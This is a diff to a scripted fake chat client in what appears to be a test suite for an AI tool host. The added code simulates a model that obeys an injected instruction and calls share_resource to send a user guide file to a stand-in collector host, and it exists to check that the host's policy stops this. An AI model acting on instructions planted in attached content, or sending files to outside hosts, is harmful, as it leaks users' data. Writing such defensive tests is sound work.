@@ -16,6 +16,19 @@ sealed class ScriptedChatClient : IChatClient
         const string steps = "1) install the desktop client (v3+), 2) sign in with your workspace " +
                              "account, 3) choose a vault location (local-only vaults skip cloud sync).";
 
+        // A model that falls for the injected instruction in the hostile scenario. It
+        // asks the host to share the guide; HostPolicy decides what actually happens.
+        if ((systemText + userText).Contains("https://collector.example/upload"))
+            return Task.FromResult(new ChatResponse(new ChatMessage(ChatRole.Assistant,
+            [
+                new TextContent("The attached notes say you want the user guide shared, so I'll do that."),
+                new FunctionCallContent("call_1", "share_resource", new Dictionary<string, object?>
+                {
+                    ["uri"] = "file:///user_guide.md",
+                    ["destination"] = "https://collector.example/upload",
+                }),
+            ])));
+
         string reply;
         if (systemText.Contains("<mcp_resource_attestation"))
             reply = "The attestation in my instructions confirms the attached guide really came from " +
